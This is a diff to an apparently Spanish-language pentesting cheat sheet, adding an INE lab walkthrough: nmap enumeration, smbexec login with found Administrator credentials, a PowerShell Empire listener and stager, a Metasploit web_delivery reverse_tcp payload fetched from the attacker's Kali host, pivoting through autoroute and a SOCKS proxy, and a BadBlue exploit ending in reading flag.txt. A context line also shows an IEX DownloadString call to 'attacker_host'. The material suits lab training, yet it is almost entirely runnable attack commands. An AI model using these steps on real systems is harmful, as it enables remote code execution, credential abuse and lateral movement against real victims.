@@ -152,6 +152,62 @@ PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://attacker_host/scr
 ### ~ PowerShell for Pentesting
 
 ```bash
+# Leveraging PowerShell During Exploitation
+10.4.30.114    demo.ine.local -> acceso directo
+10.4.20.133    fileServer.ine.local -> pivotar
+nmap -p- demo.ine.local # enumeracion
+nmap -sV -p 4983 demo.ine.local # verificamos servicio
+# Al ingresar al servicio HTTP encontramos /user:Administrator abc_123321!@#
+smbexec.py 'Administrator:abc_123321!@#'@demo.ine.local # Probamos acceso con smb
+
+# Empezamos powershell-empire
+powershell-empire server # servidor en una nueva terminal
+powershell-empire client # cliente en otra terminal
+(Empire) > uselistener http # área de configuración del oyente http
+set Host 10.10.42.2 # ip de mi kali
+set Port 8888 # puerto de mi kali
+#  Ahora que nuestro oyente está despierto y "escuchando", querremos generar un "stager" El "stager" es el código que ejecutaremos en nuestro objetivo una vez que lo generemos. Podemos generar un stager saliendo primero del área "Listener" y regresando a la sección "main" ejecutando el comando "main" y luego escribiendo el comando "usestager". Si escribimos "usestager" " Deberíamos obtener una lista de todos los escenarios disponibles.
+(Empire) > usestager multi/launcher # 
+(Empire: usestager/multi/launcher) > set Listener http # el nombre de nuestro oyente era "http"
+(Empire: usestager/multi/launcher) > execute #  Empire genera nuestro código de stager
+#En este punto, Empire ha generado un comando codificado en PowerShell. Luego copiamos y pegamos el código PowerShell generado por Empire en nuestro shell smbexec
+# Si ahora escribimos el comando "agentes" dentro de Empire, podemos confirmar que nuestro agente ha llamado a casa a Empire C2 y actualmente está activo a través del proceso "powershell" en el sistema de destino
+[+] New agent 631AN7HD checked in
+(Empire: agents) > interact 631AN7HD # Interactar con el agente 
+(Empire: 631AN7HD) > usemodule powershell/situational_awareness/host/computerdetails # Usar modulos (como en msfconsole)
+usemodule powershell/situational_awareness/network/portscan
+set Hosts 10.4.20.133 # la maquina faltante
+msfconsole # en otra terminal
+use exploit/multi/script/web_delivery
+set target 2
+set SRVHOST 10.10.42.2 # Esta es la dirección IP de la máquina Kali.
+set LHOST 10.10.42.2
+set payload windows/meterpreter/reverse_tcp
+exploit # se genera http://10.10.42.2:8080/E8tlUIOl
+usemodule powershell/code_execution/invoke_metasploitpayload # De vuelta en nuestro Empire C2, para pasar nuestro agente a metasploit, necesitamos cargar el módulo "invoke_metasploitpayload".
+usemodule powershell/code_execution/invoke_metasploitpayload
+set URL http://10.10.42.2:8080/E8tlUIOl
+execute
+use post/multi/manage/autoroute
+set SESSION 1
+run
+use auxiliary/server/socks_proxy
+set SRVHOST 10.10.42.2
+run
+# A continuación, después de configurar el módulo proxy Socks, debemos configurar nuestro navegador para usar nuestro proxy Socks5.
+# Luego seleccione Configuración de red para abrir la configuración de conexión. Seleccione SOCKS Host y proporcione la dirección IP de la máquina Kali y el puerto como 1080.
+# Abra otra pestaña en Firefox. Deberíamos poder navegar a la máquina fileserver.ine.local y observamos que BadBlue Enterprise Edition se está ejecutando en la máquina remota.
+
+search badblue # en metasploit
+use 1
+set RHOSTS fileserver.ine.local
+set PAYLOAD windows/meterpreter/bind_tcp
+exploit
+pwd
+cd ../../../
+pwd
+ls
+cat flag.txt
 
 ```
 
